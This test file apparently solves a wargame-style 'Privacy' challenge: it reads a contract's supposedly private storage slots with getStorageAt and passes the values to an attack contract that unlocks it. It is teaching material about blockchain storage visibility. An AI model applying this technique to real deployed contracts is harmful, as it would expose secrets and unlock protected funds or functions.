
import { accounts, contract, web3 } from '@openzeppelin/test-environment';
const { ether, balance } = require('@openzeppelin/test-helpers');
import assert = require('assert');

// Addresses
const [
    owner, // Contract owner
    attacker, // Attacker
] = accounts;

// Loads contracts
const Privacy = contract.fromArtifact('Privacy');
const PrivacyAttack = contract.fromArtifact('PrivacyAttack');
let privacy: any;
let privacyAttack: any;


beforeEach(async () => {
    const a = web3.utils.rightPad(web3.utils.fromAscii('sergi'), 64);
    const b = web3.utils.rightPad(web3.utils.fromAscii('having'), 64);
    const c = web3.utils.rightPad(web3.utils.fromAscii('fun'), 64);

    privacy = await Privacy.new([a, b, c], { from: owner })
    privacyAttack = await PrivacyAttack.new({ from: attacker });
});

it('Privacy -> unlock the contract', async () => {
    const lockedBefore = await privacy.locked.call();

    // Retrieve storage from `bytes32[3] private data;`
    const element1 = await web3.eth.getStorageAt(privacy.address, 3);
    const element2 = await web3.eth.getStorageAt(privacy.address, 4);
    const element3 = await web3.eth.getStorageAt(privacy.address, 5);

    // Apply same conversion from function unlock()
    await privacyAttack.attack(privacy.address, [element1, element2, element3], { from: attacker });

    const lockedAfter = await privacy.locked.call();

    assert(lockedBefore === true, 'locked before');
    assert(lockedAfter === false, 'locked after');
});
